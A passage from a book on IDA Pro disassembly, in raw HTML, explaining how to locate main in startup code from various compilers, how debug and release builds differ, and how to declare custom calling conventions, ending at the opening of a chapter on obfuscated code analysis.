.text:0040102E          <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>call    sub_401120</pre><p>Clearly this code does not map cleanly to the previous Linux-based example. However, there is one striking similarity: only one function is called <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33948"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>, and the function takes a function pointer for parameter <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e33954"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>. In this case <code class="literal">sub_401120</code> serves much the same purpose as <code class="literal">___libc_start_main</code>, while <code class="literal">sub_4010B0</code> turns out to be the <code class="literal">main</code> function of the program.</p><p>Windows binaries compiled using gcc/MinGW make use of yet another style of <code class="literal">start</code> function, as shown here:<a class="indexterm" id="IDX-CHP-20-0036"/><a class="indexterm" id="IDX-CHP-20-0037"/></p><a id="I_programlisting1_d1e33984"/><pre class="programlisting">.text:00401280 start           proc near
.text:00401280
.text:00401280 var_8           = dword ptr −8
.text:00401280
.text:00401280                 push    ebp
.text:00401281                 mov     ebp, esp
.text:00401283                 sub     esp, 8
.text:00401286                 mov     [esp+8+var_8], 1
.text:0040128D                 call    ds:__set_app_type
.text:00401293                <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>call    sub_401150
.text:00401293 start           endp</pre><p>This is another case in which IDA will fail to identify the program’s <code class="literal">main</code> function. The preceding code offers few clues as to the location of <code class="literal">main</code>, as there is only one nonlibrary function called <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34001"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> (<code class="literal">sub_401150</code>) and that function does not appear to take any arguments (as <code class="literal">main</code> should). In this instance, the best course of action is to continue the search for <code class="literal">main</code> within <code class="literal">sub_401150</code>. A portion of <code class="literal">sub_401150</code> is shown here:</p><a id="I_programlisting1_d1e34023"/><pre class="programlisting">.text:0040122A                 call    __p__environ
.text:0040122F                 mov     eax, [eax]
.text:00401231                <img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/>mov     [esp+8], eax
.text:00401235                 mov     eax, ds:dword_404000
.text:0040123A                <img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>mov     [esp+4], eax
.text:0040123E                 mov     eax, ds:dword_404004
.text:00401243                <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>mov     [esp], eax
.text:00401246                <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>call    sub_401395
.text:0040124B                 mov     ebx, eax
.text:0040124D                 call    _cexit
.text:00401252                 mov     [esp], ebx
.text:00401255                 call    ExitProcess</pre><p>In this example, the function turns out to have many similarities with the <code class="literal">start</code> function associated with FreeBSD that we saw earlier. Process of elimination points to <code class="literal">sub_401395</code> as the likely candidate for <code class="literal">main</code>, as it is the only non-library function that is called with three arguments—<span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34060"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>, <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34066"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>, and <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34073"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span>. Also, the third argument <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34079"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span> is related to the return value of the <code class="literal">__p__environ</code> library function, which correlates well with the fact that <code class="literal">main</code>’s third argument is expected to be a pointer to the environment strings array. The example code is also preceded by a call to the <code class="literal">getmainargs</code> library function (not shown), which is called to set up the <code class="literal">argc</code> and <code class="literal">argv</code> parameters prior to actually calling <code class="literal">main</code>. This helps to reinforce the notion that <code class="literal">main</code> is about to be called.<a class="indexterm" id="IDX-CHP-20-0038"/><a class="indexterm" id="IDX-CHP-20-0039"/></p><p>The start routine for Visual C/C++ code is short and sweet, as seen here:<a class="indexterm" id="IDX-CHP-20-0040"/><a class="indexterm" id="IDX-CHP-20-0041"/><a class="indexterm" id="IDX-CHP-20-0042"/></p><a id="I_programlisting1_d1e34126"/><pre class="programlisting">.text:0040134B start           proc near
.text:0040134B                 call    ___security_init_cookie
.text:00401350                 jmp     ___tmainCRTStartup
.text:00401350 start           endp</pre><p>IDA has actually recognized the library routines referenced in the two instructions through the application of startup signatures rather than by the fact that the program is linked to a dynamic library containing the given symbols. IDA’s startup signatures provide easy location of the initial call to <code class="literal">main</code>, as shown here:</p><a id="I_programlisting1_d1e34133"/><pre class="programlisting">.text:004012D8                 mov     eax, envp
.text:004012DD                 mov     dword_40ACF4, eax
.text:004012E2                 push    eax             ; envp
.text:004012E3                 push    argv            ; argv
.text:004012E9                 push    argc            ; argc
.text:004012EF                <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>call    _main
.text:004012F4                 add     esp, 0Ch
.text:004012F7                 mov     [ebp+var_1C], eax
.text:004012FA                 cmp     [ebp+var_20], 0
.text:004012FE                 jnz     short $LN35
.text:00401300                 push    eax             ; uExitCode
.text:00401301                 call    $LN27
.text:00401306 $LN35:                      ; CODE XREF: ___tmainCRTStartup+169âj
.text:00401306                 call    __cexit
.text:0040130B                 jmp     short loc_40133B</pre><p>Within the entire body of <code class="literal">tmainCRTStartup</code>, <code class="literal">_main</code> is the only function called with exactly three arguments. Further analysis would reveal that the call to <code class="literal">_main</code> is preceded by a call to the <code class="literal">GetCommandLine</code> library function, which is yet another indication that a program’s <code class="literal">main</code> function may be called shortly. As a final note concerning the use of startup signatures, it is important to understand that, in this example, IDA has generated the name <code class="literal">_main</code> entirely on its own as a result of matching a startup signature. The ASCII string <code class="literal">main</code> appeared nowhere in the binary used in this example. Thus, you can expect <code class="literal">main</code> to be found and labeled anytime a startup signature is matched, even when a binary has been stripped of its symbols.</p><p>The last startup routine that we will examine for a C compiler is generated by Borland’s free command-line compiler. <sup>[<a class="footnote" href="#ftn.CHP-20-FN-6" id="CHP-20-FN-6">145</a>]</sup> The last few lines of Borland’s start routine are shown here:<a class="indexterm" id="IDX-CHP-20-0043"/></p><a id="I_programlisting1_d1e34183"/><pre class="programlisting">.text:00401041                <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>push    offset off_4090B8
.text:00401046                 push    0               ; lpModuleName
.text:00401048                 call    GetModuleHandleA
.text:0040104D                 mov     dword_409117, eax
.text:00401052                 push    0          ; fake return value
.text:00401054                 jmp     __startup</pre><p>The pointer value pushed on the stack <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34193"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> refers to a structure that in turn contains a pointer to <code class="literal">main</code>. Within <code class="literal">__startup</code>, the setup to call <code class="literal">main</code> is shown here:<a class="indexterm" id="IDX-CHP-20-0044"/><a class="indexterm" id="IDX-CHP-20-0045"/><a class="indexterm" id="IDX-CHP-20-0046"/></p><a id="I_programlisting1_d1e34219"/><pre class="programlisting">.text:00406997                 mov     edx, dword_40BBFC
.text:0040699D                <img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/>push    edx
.text:0040699E                 mov     ecx, dword_40BBF8
.text:004069A4                <img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>push    ecx
.text:004069A5                 mov     eax, dword_40BBF4
.text:004069AA                <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>push    eax
.text:004069AB                <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>call    dword ptr [esi+18h]
.text:004069AE                 add     esp, 0Ch
.text:004069B1                 push    eax             ; status
.text:004069B2                 call    _exit</pre><p>Again, this example bears many similarities to previous examples in that the call to <code class="literal">main</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34250"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> takes three arguments <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34256"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>, <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34262"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>, and <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34268"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span> (the only function called within <code class="literal">__startup</code> to do so) and the return value is passed directly to <code class="literal">_exit</code> to terminate the program. Additional analysis of <code class="literal">__startup</code> would reveal calls to the Windows API functions <code class="literal">GetEnvironmentStrings</code> and <code class="literal">GetCommandLine</code>, which are often precursors to the invocation of <code class="literal">main</code>.</p><p>Finally, in order to demonstrate that tracking down a program’s <code class="literal">main</code> function is not a problem specific to C programs, consider the following startup code from a compiled Visual Basic 6.0 program:</p><a id="I_programlisting1_d1e34298"/><pre class="programlisting">.text:004018A4 start:
.text:004018A4               <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>push    offset dword_401994
.text:004018A9               call    ThunRTMain</pre><p>The <code class="literal">ThunRTMain</code> library function performs a function similar to the Linux <code class="literal">libc_start_main</code> function in that its job is to perform any initialization required prior to invoking the actual <code class="literal">main</code> function of the program. In order to transfer control to the <code class="literal">main</code> function, Visual Basic utilizes a mechanism very similar to that in the Borland code in the earlier examples. <code class="literal">ThunRTMain</code> takes a single argument <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34324"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>, which is a pointer to a structure containing additional information required for program initialization, including the address of the <code class="literal">main</code> function. The content of this structure is shown here:</p><a id="I_programlisting1_d1e34333"/><pre class="programlisting">.text:00401994 dword_401994    dd 21354256h, 2A1FF0h,
 3 dup(0) ; DATA XREF: .text:start↑o
.text:004019A8                 dd 7Eh, 2 dup(0)
.text:004019B4                 dd 0A0000h, 409h, 0
.text:004019C0                <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>dd offset sub_4045D0
.text:004019C4                 dd offset dword_401A1C
.text:004019C8                 dd 30F012h, 0FFFFFF00h, 8, 2
 dup(1), 0E9h, 401944h, 4018ECh
.text:004019C8                 dd 4018B0h, 78h, 7Dh, 82h, 83h, 4 dup(0)</pre><p>Within this data structure, there is only one item <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34343"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> that appears to reference code at all, the pointer to <code class="literal">sub_4045D0</code>, which turns out to be the <code class="literal">main</code> function for the program.</p><p>In the end, learning how to find <code class="literal">main</code> is a matter of understanding how executable files are built. In cases where you are experiencing difficulties, it may be beneficial to build some simple executables (with a reference to an easily identifiable string in <code class="literal">main</code>, for example) with the same tools used to build the binary you are analyzing. By studying your test cases, you will gain an understanding of the basic structure of binaries built using a specific set of tools that may assist you in further analyzing more complex binaries built with the same set of tools.<a class="indexterm" id="IDX-CHP-20-0047"/><a class="indexterm" id="IDX-CHP-20-0048"/><a class="indexterm" id="IDX-CHP-20-0049"/><a class="indexterm" id="IDX-CHP-20-0050"/><a class="indexterm" id="IDX-CHP-20-0051"/></p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-20-FN-5" id="ftn.CHP-20-FN-5">144</a>] </sup>Windows GUI applications require a <code class="literal">WinMain</code> function instead of <code class="literal">main</code>. Documentation regarding <code class="literal">WinMain</code> can be found here: <a class="ulink" href="http://msdn2.microsoft.com/en-us/library/ms633559.aspx">http://msdn2.microsoft.com/en-us/library/ms633559.aspx</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-20-FN-6" id="ftn.CHP-20-FN-6">145</a>] </sup>See <a class="ulink" href="http://forms.embarcadero.com/forms/BCC32CompilerDownload/">http://forms.embarcadero.com/forms/BCC32CompilerDownload/</a>.</p></div></div></div>
<div class="sect1" title="Debug vs. Release Binaries"><div class="titlepage"><div><div><h1 class="title"><a id="debug_vs._release_binaries"/>Debug vs. Release Binaries</h1></div></div></div><p>Microsoft’s Visual Studio projects are usually capable of building either debug or release versions of program binaries. One way to note the differences is to compare the build options specified for the debug version of a project to the build options specified for the release version. Simple differences include the fact that release versions are generally optimized,<sup>[<a class="footnote" href="#ftn.CHP-20-FN-7" id="CHP-20-FN-7">146</a>]</sup> while debug versions are not, and debug versions are linked with additional symbol information and debugging versions of the runtime library, while release versions are not. The addition of debugging-related symbols allows debuggers to map assembly language statements back to their source code counterparts and to determine the names of local variables.<sup>[<a class="footnote" href="#ftn.CHP-20-FN-8" id="CHP-20-FN-8">147</a>]</sup> Such information is typically lost during the compilation process. The debugging versions of Microsoft’s runtime libraries have also been compiled with debugging symbols included, optimizations disabled, and additional safety checks enabled to verify that some function parameters are valid.<a class="indexterm" id="IDX-CHP-20-0052"/></p><p>When disassembled using IDA, debug builds of Visual Studio projects look significantly different from release builds. This is a result of compiler and linker options specified only in debug builds, such as basic runtime checks (/RTCx<sup>[<a class="footnote" href="#ftn.CHP-20-FN-9" id="CHP-20-FN-9">148</a>]</sup>), which introduce extra code into the resulting binary. A side effect of this extra code is that it defeats IDA’s startup signature-matching process, resulting in IDA’s frequent failure to automatically locate <code class="literal">main</code> in debug builds of binaries.<a class="indexterm" id="IDX-CHP-20-0053"/></p><p>One of the first differences you may notice in a debug build of a binary is that virtually all functions are reached via <span class="emphasis"><em>jump</em></span> functions (also known as <span class="emphasis"><em>thunk</em></span> functions), as shown in the following code fragments:</p><a id="I_programlisting1_d1e34420"/><pre class="programlisting"><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/> .text:00411050
 sub_411050      proc near               ; CODE XREF: start_0+3↓p
  .text:00411050                <img alt="" src="httpatomoreillycomsourcenostarchimages854101.png"/>jmp     sub_412AE0
   .text:00411050 sub_411050     endp
  ...
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> .text:0041110E start           proc near
    .text:0041110E                <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>jmp     start_0
  .text:0041110E start           endp
  ...
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/> .text:00411920 start_0         proc near               ; CODE XREF: start↑j
  .text:00411920                 push    ebp
  .text:00411921                 mov     ebp, esp
  .text:00411923                <img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/>call    sub_411050
  .text:00411928                 call    sub_411940
  .text:0041192D                 pop     ebp
  .text:0041192E                 retn
  .text:0041192E start_0         endp</pre><p>In this example, the program entry point <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34459"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> does nothing other than jump <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34465"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> to the actual startup function <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34471"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>. The startup function, in turn, calls <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34477"/><img alt="" src="httpatomoreillycomsourcenostarchimages854095.png"/></span> another function <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34483"/><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/></span>, which simply jumps <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34490"/><img alt="" src="httpatomoreillycomsourcenostarchimages854101.png"/></span> to the actual implementation of that function. The two functions <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34496"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> and <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34502"/><img alt="" src="httpatomoreillycomsourcenostarchimages854099.png"/></span> that contain nothing but a single jump statement are called <span class="emphasis"><em>thunk</em></span> functions. The heavy use of thunk functions in debug binaries is one of the obstacles to IDA’s signature-matching process. While the presence of thunk functions may briefly slow down your analysis, using the techniques described in the previous section, it is still possible to track down the <code class="literal">main</code> function of the binary.</p><p>The basic runtime checks in a debug build cause several additional operations to be performed upon entry to any function. An example of an extended prologue in a debug build is shown here:</p><a id="I_programlisting1_d1e34516"/><pre class="programlisting">.text:00411500                 push    ebp
.text:00411501                 mov     ebp, esp
.text:00411503                <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>sub     esp, 0F0h
.text:00411509                 push    ebx
.text:0041150A                 push    esi
.text:0041150B                 push    edi
.text:0041150C                <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>lea     edi, [ebp+var_F0]
.text:00411512                 mov     ecx, 3Ch
.text:00411517                 mov     eax, 0CCCCCCCCh
.text:0041151C                 rep stosd
.text:0041151E                <img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>mov     [ebp+var_8], 0
.text:00411525                 mov     [ebp+var_14], 1
.text:0041152C                 mov     [ebp+var_20], 2
.text:00411533                 mov     [ebp+var_2C], 3</pre><p>The function in this example utilizes four local variables that should require only 16 bytes of stack space. Instead we see that this function allocates 240 bytes <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34538"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> of stack space and then proceeds to fill each of the 240 bytes with the value <code class="literal">0xCC</code>. The four lines starting at <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34547"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> equate to the following function call:</p><a id="I_programlisting1_d1e34553"/><pre class="programlisting">memset(&amp;var_F0, 0xCC, 240);</pre><p>The byte value <code class="literal">0xCC</code> corresponds to the x86 opcode for <code class="literal">int 3</code>, which is a software interrupt that causes a program to trap to a debugger. The intent of filling the stack frame with an overabundance of <code class="literal">0xCC</code> values may be to ensure that the debugger is invoked in the event that the program somehow attempts to execute instructions from the stack (an error condition that one would hope to catch in a debug build).<a class="indexterm" id="IDX-CHP-20-0054"/><a class="indexterm" id="IDX-CHP-20-0055"/><a class="indexterm" id="IDX-CHP-20-0056"/></p><p>The function’s local variables are initialized beginning at <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34582"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>, where we note that the variables are not adjacent to one another. The intervening space will have been filled with the value <code class="literal">0xCC</code> by the preceding <code class="literal">memset</code> operation. Providing extra space between variables in this manner can make it easier to detect overflows from one variable that may spill into and corrupt another variable. Under normal conditions, none of the <code class="literal">0xCC</code> values used as filler, outside of any declared variables, should be overwritten. For comparison purposes, the release version of the same code is shown here:</p><a id="I_programlisting1_d1e34597"/><pre class="programlisting">.text:004018D0                 push    ebp
.text:004018D1                 mov     ebp, esp
.text:004018D3                <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>sub     esp, 10h
.text:004018D6                <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>mov     [ebp+var_4], 0
.text:004018DD                 mov     [ebp+var_C], 1
.text:004018E4                 mov     [ebp+var_8], 2
.text:004018EB                 mov     [ebp+var_10], 3</pre><p>In the release version we see that only the required amount of space is requested for local variables <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34613"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> and that all four local variables are adjacent to one another <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34619"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>. Also note that the use of <code class="literal">0xCC</code> as a filler value has been eliminated.</p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-20-FN-7" id="ftn.CHP-20-FN-7">146</a>] </sup><span class="emphasis"><em>Optimization</em></span> generally involves elimination of redundancy in code or selection of faster, but potentially larger, sequences of code in order to satisfy a developer’s desire to create either faster or smaller executable files. Optimized code may not be as straightforward to analyze as nonoptimized code and may therefore be considered a bad choice for use during a program’s development and debugging phases.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-20-FN-8" id="ftn.CHP-20-FN-8">147</a>] </sup>gcc also offers the ability to insert debugging symbols during the compilation process.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-20-FN-9" id="ftn.CHP-20-FN-9">148</a>] </sup>See <a class="ulink" href="http://msdn.microsoft.com/en-us/library/8wtf2dfz.aspx">http://msdn.microsoft.com/en-us/library/8wtf2dfz.aspx</a>.</p></div></div></div>
<div class="sect1" title="Alternative Calling Conventions"><div class="titlepage"><div><div><h1 class="title"><a id="alternative_calling_conventions"/>Alternative Calling Conventions</h1></div></div></div><p>In <a class="xref" href="ch06.html" title="Chapter 6. Disassembly Navigation">Chapter 6</a>, we discussed the most common calling conventions utilized in C and C++ code. While adherence to a published calling convention is crucial when attempting to interface one compiled module to another, nothing prohibits the use of custom calling conventions by functions within a single module. This is commonly seen in highly optimized functions that are not designed to be called from outside the module in which they reside.<a class="indexterm" id="IDX-CHP-20-0057"/></p><p>The following code represents the first four lines of a function that uses a nonstandard calling convention:</p><a id="I_programlisting1_d1e34640"/><pre class="programlisting">.text:000158AC sub_158AC       proc near
  .text:000158AC
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> .text:000158AC arg_0           = dword ptr  4
  .text:000158AC
  .text:000158AC                 push    [esp+arg_0]
  .text:000158B0              <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>mov     edx, [eax+118h]
  .text:000158B6                 push    eax
  .text:000158B7              <img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>movzx   ecx, cl
  .text:000158BA                 mov     cl, [edx+ecx+0A0h]</pre><p>According to IDA’s analysis, only one argument <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34662"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> exists in the function’s stack frame. However, upon closer inspection of the code, you can see that both the EAX register <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34668"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> and the CL register <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34674"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span> are used without any initialization taking place within the function. The only possible conclusion is that both EAX and CL are expected to be initialized by the caller. Therefore, you should view this function as a three-argument function rather than a single-argument function, and you must take special care when calling it to ensure that the three arguments are all in their proper places.<a class="indexterm" id="IDX-CHP-20-0058"/><a class="indexterm" id="IDX-CHP-20-0059"/></p><p>IDA allows you to specify custom calling conventions for any function by setting the function’s “type.” This is done by entering the function’s prototype via the Edit ▸ Functions ▸ Set function type menu option and using IDA’s <code class="literal">__usercall</code> calling convention. <a class="xref" href="ch20s05.html#designating_a_function_as_underscore_und" title="Figure 20-1. Designating a function as __usercall">Figure 20-1</a> shows the resulting dialog used to set the type for <code class="literal">sub_158AC</code> in the preceding example.</p><div class="figure"><a id="designating_a_function_as_underscore_und"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject1_d1e34701"/><img alt="Designating a function as __usercall" src="httpatomoreillycomsourcenostarchimages854313.png.jpg"/></div></div><p class="title">Figure 20-1. Designating a function as <code class="literal">__usercall</code></p></div><p>For clarity, the declaration is shown again here:</p><a id="I_programlisting1_d1e34708"/><pre class="programlisting">int __usercall sub_158AC&lt;eax&gt;(struc_1 *&lt;eax&gt;, unsigned __int8 index&lt;cl&gt;, int)</pre><p>Here the IDA keyword <code class="literal">__usercall</code> is used in place of one of the standard calling conventions such as <code class="literal">__cdecl</code> or <code class="literal">__stdcall</code>. The use of <code class="literal">__usercall</code> requires us to tell IDA the name of the register used to hold the function’s return value by appending the register name to the name of the function (yielding <code class="literal">sub_158AC&lt;eax&gt;</code> in this case). If the function returns no value, the return register may be omitted. Within the parameter list, each register-based parameter must also be annotated by appending the corresponding register name to the parameter’s data type. After the function’s type has been set, IDA propagates parameter information to calling functions, which results in improved commenting of function call sequences as shown in the following listing:</p><a id="I_programlisting1_d1e34727"/><pre class="programlisting">.text:00014B9F       <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>lea     eax, [ebp+var_218] ; struc_1 *
.text:00014BA5       <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>mov     cl, 1           ; index
.text:00014BA7       <img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>push    edx             ; int
.text:00014BA8        call    sub_158AC</pre><p>Here it is clear that IDA recognizes that EAX will hold the first argument to the function <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34750"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>, CL will hold the second argument <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34756"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>, and the third argument will placed on the stack <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34762"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>.</p><p>To demonstrate that calling conventions can vary widely even with a single executable, a second example using a custom calling convention is taken from the same binary file and shown here:</p><a id="I_programlisting1_d1e34770"/><pre class="programlisting">.text:0001669E sub_1669E       proc near
  .text:0001669E
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> .text:0001669E arg_0           = byte ptr  4
  .text:0001669E
  .text:0001669E              <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>mov     eax, [esi+18h]
  .text:000166A1                 add     eax, 684h
  .text:000166A6                 cmp     [esp+arg_0], 0</pre><p>Here again, IDA has indicated that the function accesses only one argument <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34786"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> within the stack frame. Closer inspection makes it quite clear that the ESI register <span class="inlinemediaobject"><a id="I_inlinemediaobject1_d1e34792"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> is also expected to be initialized prior to calling this function. This example demonstrates that even with the same binary file, the registers chosen to hold register-based arguments may vary from function to function.</p><p>The lesson to be learned here is to make certain that you understand how each register used in a function is initialized. If a function makes use of a register prior to initializing that register, then the register is being used to pass a parameter. Please refer to <a class="xref" href="ch06.html" title="Chapter 6. Disassembly Navigation">Chapter 6</a> for a review of which registers are used by various compilers and common calling conventions.</p></div>
<div class="sect1" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="summary-id19"/>Summary</h1></div></div></div><p>The number of compiler-specific behaviors is too numerous to cover in a single chapter (or even a single book for that matter). Among other behaviors, compilers differ in the algorithms they employ to implement various high-level constructs and the manner in which they choose to optimize generated code. Because a compiler’s behavior is heavily influenced by the options supplied to the compiler during the build process, it is possible for one compiler to generate radically different binaries when fed the same source but different build options. Unfortunately, learning to cope with all of these variations is usually a matter of experience. Further complicating matters is the fact that it often very difficult to search for help on specific assembly language constructs, as it is very difficult to craft search expressions that will yield results specific to your particular case. When this happens, your best resource is generally a forum dedicated to reverse engineering in which you can post code and benefit from the knowledge of others who have had similar experiences.</p></div>
<div class="chapter" title="Chapter&#xA0;21.&#xA0;Obfuscated Code Analysis"><div class="titlepage"><div><div><h1 class="title"><a id="obfuscated_code_analysis"/>Chapter 21. Obfuscated Code Analysis</h1></div></div></div><div class="informalfigure"><a id="image_no_caption-id20"/><div class="mediaobject"><a id="I_mediaobject2_d1e34811"/><img alt="image with no caption" src="httpatomoreillycomsourcenostarchimages854059.png.jpg"/></div></div><p>Even under ideal circumstances, comprehending a disassembly listing is a difficult task at best. High-quality disassemblies are essential for anyone contemplating digging into the inner workings of a binary, which is precisely why we have spent the last 20 chapters discussing IDA Pro and its capabilities. It can be argued that IDA is so effective at what it does that it has lowered the barriers for entry into the binary analysis field. While certainly not attributable to IDA alone, the fact that the state of binary reverse engineering has advanced so far in recent years is not lost on anyone who does not want his software to be analyzed. Thus, over the last several years, an arms race of sorts has been taking place between reverse engineers and programmers who wish to keep their code secret. In this chapter we will examine IDA’s role in this arms race and discuss some of the measures that have been taken to protect code, along with how to defeat those measures using IDA.<a class="indexterm" id="IDX-CHP-21-0001"/><a class="indexterm" id="IDX-CHP-21-0002"/></p><p>Various dictionary definitions will inform you that <span class="emphasis"><em>obfuscation</em></span> is the act of making something obscure, perplexing, confusing, or bewildering in order to prevent others from understanding the obfuscated item. Anti–reverse engineering, on the other hand, encompasses a broader range of techniques (obfuscation being one of them) designed to hinder analysis of an item. In the context of this book and the use of IDA, the items to which such anti–reverse engineering techniques may be applied are binary executable files (as opposed to source files or silicon chips, for example).<a class="indexterm" id="IDX-CHP-21-0003"/><a class="indexterm" id="IDX-CHP-21-0004"/><a class="indexterm" id="IDX-CHP-21-0005"/><a class="indexterm" id="IDX-CHP-21-0006"/><a class="indexterm" id="IDX-CHP-21-0007"/><a class="indexterm" id="IDX-CHP-21-0008"/></p><p>In order to consider the impact of obfuscation, and anti–reverse engineering techniques in general, on the use of IDA, it is first useful to categorize some of these techniques in order to understand exactly how each may manifest itself. It is important to note that there is no one correct way to categorize each technique, as the general categories that follow often overlap in their descriptions. In addition, new anti–reverse engineering techniques are under continuous development, and it is not possible to provide a single, all-inclusive list.</p><div class="sect1" title="Anti–Static Analysis Techniques"><div class="titlepage"><div><div><h1 class="title"><a id="antinstatic_analysis_techniques"/>Anti–Static Analysis Techniques</h1></div></div></div><p>The primary purpose of anti–static analysis techniques is to prevent an analyst from understanding the nature of a program without actually running the program. These are precisely the types of techniques that target disassemblers such as IDA and are thus of greatest concern if IDA is your weapon of choice for reverse engineering binaries. Several types of anti–static analysis techniques are discussed here.<a class="indexterm" id="IDX-CHP-21-0009"/></p><div class="sect2" title="Disassembly Desynchronization"><div class="titlepage"><div><div><h2 class="title"><a id="disassembly_desynchronization"/>Disassembly Desynchronization</h2></div></div></div><p>One of the older techniques designed to frustrate the disassembly process involves the creative use of instructions and data to prevent the disassembly from finding the correct starting address for one or more instructions. Forcing the disassembler to lose track of itself in this manner usually results in a failed or, at a minimum, incorrect disassembly listing.</p><p>The following listing shows IDA’s efforts to disassemble a portion of the Shiva<sup>[<a class="footnote" 